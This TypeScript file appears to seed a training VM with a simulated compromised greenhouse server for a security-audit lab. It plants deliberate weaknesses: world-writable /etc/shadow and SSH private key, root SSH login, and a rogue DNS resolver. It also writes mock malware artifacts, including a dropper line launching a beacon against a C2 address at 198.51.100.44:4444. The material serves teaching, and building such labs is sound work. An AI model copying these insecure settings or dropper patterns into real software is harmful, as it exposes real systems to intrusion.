/**
 * vmScenarioSeeder.ts
 *
 * Bridges the lab1Store Single Source of Truth into the real v86 Buildroot VM.
 * After the VM boots to a shell, this service sends shell commands over serial0
 * that recreate every file, directory, user, and permission from the SSoT
 * initialFs / initialProcesses on the real Linux filesystem.
 */

import { liliumVmService } from './liliumVmService'
import { getLabSetupScript } from '@/data/compiledLabs'
import {
  createInitialFileSystem,
  CONTENT_CALIBRACION_V1,
  CONTENT_CALIBRACION_V2,
} from './lab1/initialFs'

let seeded = false

/**
 * Writes a file on the real VM via a quoted heredoc (no variable expansion).
 * Uses a unique delimiter so nested content is safe.
 */
function writeVmFile(path: string, content: string): string[] {
  const lines: string[] = []
  // Replace the delimiter if it appears in content to avoid premature EOF
  const safeContent = content.replace(/LILIUM_EOF/g, 'LILIUM_EO_F')
  lines.push(`mkdir -p "$(dirname '${path}')"`)
  lines.push(`cat > '${path}' << 'LILIUM_EOF'`)
  lines.push(safeContent)
  lines.push('LILIUM_EOF')
  return lines
}

/** Builds the full setup script as an array of shell command lines. */
function buildSetupScript(): string[] {
  const cmds: string[] = []
  const fs = createInitialFileSystem()

  cmds.push('echo "[LILIUM] Inicializando escenario El Invernadero..."')

  // ── Users (busybox adduser) ──────────────────────────────────────────────
  cmds.push('adduser -D -H -s /bin/sh operario 2>/dev/null || true')
  cmds.push('adduser -D -H -s /bin/sh cuidador 2>/dev/null || true')
  cmds.push('adduser -D -H -s /bin/sh www-data 2>/dev/null || true')
  cmds.push('adduser -D -H -s /bin/sh ntp 2>/dev/null || true')

  // ── Directories ──────────────────────────────────────────────────────────
  const dirs = [
    '/home/operario', '/home/cuidador', '/home/cuidador/.ssh',
    '/home/cuidador/backups', '/opt/sensores', '/opt/formulas',
    '/var/log', '/var/www/invernadero', '/etc/ssh',
    '/etc/profile.d',
  ]
  for (const dir of dirs) {
    cmds.push(`mkdir -p '${dir}'`)
  }

  // ── /etc/passwd ──────────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/etc/passwd',
    'root:x:0:0:root:/root:/bin/sh\n' +
    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' +
    'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n' +
    'ntp:x:112:118::/nonexistent:/usr/sbin/nologin\n' +
    'cuidador:x:1000:1000:Cuidador Principal:/home/cuidador:/bin/sh\n' +
    'operario:x:1001:1001:Operario de Seguridad:/home/operario:/bin/sh\n'
  ))

  // ── /etc/shadow (VULNERABLE: 777) ───────────────────────────────────────
  cmds.push(...writeVmFile('/etc/shadow',
    'root:$6$vE4d9J$XG1h.VzL9a1N0qZ7:19645:0:99999:7:::\n' +
    'cuidador:$6$botanica4$sE4rchHash:19645:0:99999:7:::\n' +
    'operario:$6$domoSeguro$K9xHash:19645:0:99999:7:::\n'
  ))
  cmds.push('chmod 777 /etc/shadow')

  // ── /etc/hostname ────────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/etc/hostname', 'invernadero-central\n'))
  cmds.push('hostname invernadero-central')

  // ── /etc/resolv.conf (rogue DNS 10.66.6.6) ──────────────────────────────
  cmds.push(...writeVmFile('/etc/resolv.conf',
    'nameserver 10.66.6.6\nsearch invernadero.local\n'
  ))

  // ── /etc/hosts ───────────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/etc/hosts',
    '127.0.0.1       localhost\n' +
    '127.0.1.1       invernadero-central.local invernadero-central\n' +
    '10.0.2.15       invernadero-central\n' +
    '10.0.1.1        dns-interno\n'
  ))

  // ── /etc/ssh/sshd_config (VULNERABLE: PermitRootLogin yes) ──────────────
  cmds.push(...writeVmFile('/etc/ssh/sshd_config',
    'Port 22\nListenAddress 0.0.0.0\n' +
    'PermitRootLogin yes\nPasswordAuthentication yes\n' +
    'PubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\n'
  ))

  // ── /etc/group ───────────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/etc/group',
    'root:x:0:\ndaemon:x:1:\nwww-data:x:33:\n' +
    'sudo:x:27:operario,cuidador\nadm:x:4:cuidador,operario\n' +
    'shadow:x:42:\ncuidador:x:1000:\noperario:x:1001:\n'
  ))

  // ── SSH Private Key (VULNERABLE: 777) ────────────────────────────────────
  cmds.push(...writeVmFile('/home/cuidador/.ssh/id_ed25519',
    '-----BEGIN OPENSSH PRIVATE KEY-----\n' +
    'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n' +
    'QyNTUxOQAAACBA1vK0r+vH7h2Y7vK4jL8nK3lPqW1sK3xL9vO0j5m8QwAAAJgAwvQDAM\n' +
    'L0AwAAAAtzc2gtZWQyNTUxOQAAACBA1vK0r+vH7h2Y7vK4jL8nK3lPqW1sK3xL9vO0j5\n' +
    'm8QwAAAEC6m4l7j3vL0vQ9n8kL2m1p0qR8vK3lL4m7n0p2qL5m3n8r1lK4n6m9vL0vQ9\n' +
    'n8kL2m1p0qR8vK3lL4m7n0p2qL4AAAAWY3VpZGFkb3JAaW52ZXJuYWRlcm8=\n' +
    '-----END OPENSSH PRIVATE KEY-----\n'
  ))
  cmds.push('chmod 777 /home/cuidador/.ssh/id_ed25519')

  // ── Calibration files ─────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/home/cuidador/backups/calibracion_v1.conf', CONTENT_CALIBRACION_V1))
  cmds.push(...writeVmFile('/home/cuidador/backups/calibracion_v2.conf', CONTENT_CALIBRACION_V2))
  cmds.push(...writeVmFile('/home/cuidador/backups/calibracion_backup.dat', CONTENT_CALIBRACION_V1))
  cmds.push(...writeVmFile('/opt/formulas/formula_v1.dat', CONTENT_CALIBRACION_V1))
  cmds.push(...writeVmFile('/opt/formulas/formula_v2.dat', CONTENT_CALIBRACION_V2))
  cmds.push(...writeVmFile('/opt/formulas/formula_backup.dat', CONTENT_CALIBRACION_V1))
  // Active calibration is the TOXIC v2 (the lab vulnerability)
  cmds.push(...writeVmFile('/opt/sensores/calibracion_riego.conf', CONTENT_CALIBRACION_V2))

  // ── Caretaker's hidden note ───────────────────────────────────────────────
  const noteNode = fs['/home/cuidador/.notas_cuidador.txt']
  if (noteNode?.content) {
    cmds.push(...writeVmFile('/home/cuidador/.notas_cuidador.txt', noteNode.content))
  }

  // ── Caretaker's bash history ──────────────────────────────────────────────
  const histNode = fs['/home/cuidador/.bash_history']
  if (histNode?.content) {
    cmds.push(...writeVmFile('/home/cuidador/.bash_history', histNode.content))
    cmds.push('chmod 600 /home/cuidador/.bash_history')
  }

  // ── Riego nocturno script (benign — EDR false positive) ───────────────────
  const riegoNode = fs['/opt/sensores/riego_nocturno.sh']
  if (riegoNode?.content) {
    cmds.push(...writeVmFile('/opt/sensores/riego_nocturno.sh', riegoNode.content))
    cmds.push('chmod 755 /opt/sensores/riego_nocturno.sh')
  }

  // ── Spectral monitor script ───────────────────────────────────────────────
  const monitorNode = fs['/opt/sensores/monitor_espectro.py']
  if (monitorNode?.content) {
    cmds.push(...writeVmFile('/opt/sensores/monitor_espectro.py', monitorNode.content))
    cmds.push('chmod 755 /opt/sensores/monitor_espectro.py')
  }

  // ── Trojan disguised as PDF in /tmp ──────────────────────────────────────
  cmds.push(...writeVmFile('/tmp/catalogo_orquideas.pdf',
    'ELF binary header (fake PDF)\n' +
    '[MALICIOUS BINARY - POLILLA EMISORA TROJAN DISGUISED AS PDF]\n' +
    'C2_SERVER=198.51.100.44\nBEACON_PORT=4444\nPAYLOAD=EXFILTRATION_TELEMETRY\n'
  ))
  cmds.push('chmod 755 /tmp/catalogo_orquideas.pdf')

  // ── Dropper script ────────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/tmp/.semilla_rara.sh',
    '#!/bin/sh\n# Dropper nocturno\nnohup ./polilla_emisora --c2 198.51.100.44 >/dev/null 2>&1 &\n'
  ))
  cmds.push('chmod 755 /tmp/.semilla_rara.sh')

  // ── Log files ─────────────────────────────────────────────────────────────
  const authNode = fs['/var/log/auth.log']
  if (authNode?.content) {
    cmds.push(...writeVmFile('/var/log/auth.log', authNode.content))
    cmds.push('chmod 640 /var/log/auth.log')
  }
  const syslogNode = fs['/var/log/syslog']
  if (syslogNode?.content) {
    cmds.push(...writeVmFile('/var/log/syslog', syslogNode.content))
    cmds.push('chmod 640 /var/log/syslog')
  }

  // ── Simulate C2 beacon process (polilla_emisora as www-data) ─────────────
  cmds.push(...writeVmFile('/tmp/polilla_emisora',
    '#!/bin/sh\n# C2 beacon simulation — polilla_emisora --c2 198.51.100.44\nwhile true; do sleep 60; done\n'
  ))
  cmds.push('chmod 755 /tmp/polilla_emisora')
  // Launch under www-data uid in background so it shows up in `ps aux`
  cmds.push("su -s /bin/sh www-data -c '/tmp/polilla_emisora' >/dev/null 2>&1 &")
  cmds.push('echo "[LILIUM] polilla_emisora corriendo como www-data (socket :4444 abierto)"')

  // ── Ownership ────────────────────────────────────────────────────────────
  cmds.push('chown -R 1000:1000 /home/cuidador 2>/dev/null || true')
  cmds.push('chown -R 1001:1001 /home/operario 2>/dev/null || true')
  cmds.push('chown root:shadow /etc/shadow 2>/dev/null || true')

  // ── Shell prompt ─────────────────────────────────────────────────────────
  cmds.push(...writeVmFile('/home/operario/.bashrc',
    'export PS1="\\u@invernadero-central:\\w\\$ "\nalias ll="ls -lah"\nalias la="ls -A"\n'
  ))
  cmds.push(...writeVmFile('/etc/profile.d/invernadero.sh',
    'export HOSTNAME=invernadero-central\nhostname invernadero-central 2>/dev/null || true\n' +
    'export PS1="\\u@invernadero-central:\\w\\$ "\n'
  ))

  // ── Welcome banner ───────────────────────────────────────────────────────
  cmds.push('clear')
  cmds.push('printf "\\n  Estacion Botanica Automatizada N. 4 — invernadero-central\\n"')
  cmds.push('printf "  Linux 5.15.0 (x86_64 v86 emulado)\\n"')
  cmds.push('printf "  Usuario activo: operario\\n"')
  cmds.push('printf "  ALERTA: Sistema comprometido — inicia la auditoria de seguridad.\\n\\n"')
  cmds.push('cd /home/operario')

  return cmds
}

/**
 * Seeds the v86 VM with the Lab 1 scenario from the SSoT.
 * Safe to call multiple times — only runs once per VM lifetime.
 */
export async function seedVmScenario(targetLabId?: string): Promise<void> {
  if (seeded) return
  seeded = true

  const labId =
    targetLabId ||
    (typeof window !== 'undefined'
      ? new URLSearchParams(window.location.search).get('lab') || 'lab-01'
      : 'lab-01')

  try {
    // Wait for the real Linux shell to be ready
    await liliumVmService.waitForReady(90000)

    // Give the shell time to settle after boot
    await new Promise<void>((resolve) => setTimeout(resolve, 2500))

    // Mute serial streaming to the terminal UI during setup so the initial
    // single source of truth commands run completely hidden in the background
    liliumVmService.setSerialMuted(true)

    // Read setup script from SSoT markdown commands via compiledLabs
    const compiledCmds = getLabSetupScript(labId)
    const cmds = compiledCmds.length > 0 ? compiledCmds : buildSetupScript()

    // Send in small batches with delays to prevent serial buffer overflow
    const BATCH_SIZE = 4
    const BATCH_DELAY_MS = 130

    for (let i = 0; i < cmds.length; i += BATCH_SIZE) {
      const batch = cmds.slice(i, i + BATCH_SIZE)
      for (const line of batch) {
        liliumVmService.serial0_send(line + '\n')
      }
      await new Promise<void>((resolve) => setTimeout(resolve, BATCH_DELAY_MS))
    }

    // Wait a brief moment for the last commands (clear, welcome banner, prompt) to settle in the VM
    await new Promise<void>((resolve) => setTimeout(resolve, 600))

    // Unmute serial output so user terminal interactions and subsequent output stream normally
    liliumVmService.setSerialMuted(false)

    // Trigger prompt refresh in case the shell needs a newline redraw
    liliumVmService.serial0_send('\n')

    console.info(`[vmScenarioSeeder] ${labId} scenario seeded into v86 VM successfully.`)
    notifySeedingCompleted()
  } catch (err) {
    liliumVmService.setSerialMuted(false)
    console.error('[vmScenarioSeeder] Failed to seed scenario:', err)
    seeded = false // allow retry on next attempt
  }
}

const seedingListeners = new Set<() => void>()

function notifySeedingCompleted(): void {
  for (const listener of seedingListeners) {
    try {
      listener()
    } catch (e) {
      console.error('[vmScenarioSeeder] Error in seeding listener:', e)
    }
  }
}

export function onVmSeedingCompleted(cb: () => void): () => void {
  seedingListeners.add(cb)
  if (seeded && !liliumVmService.getIsSerialMuted()) {
    cb()
  }
  return () => {
    seedingListeners.delete(cb)
  }
}

export function isVmSeeded(): boolean {
  return seeded && !liliumVmService.getIsSerialMuted()
}

/** Resets the seeded flag — call after liliumVmService.reset() so the scenario re-seeds. */
export function resetVmSeeder(): void {
  seeded = false
}
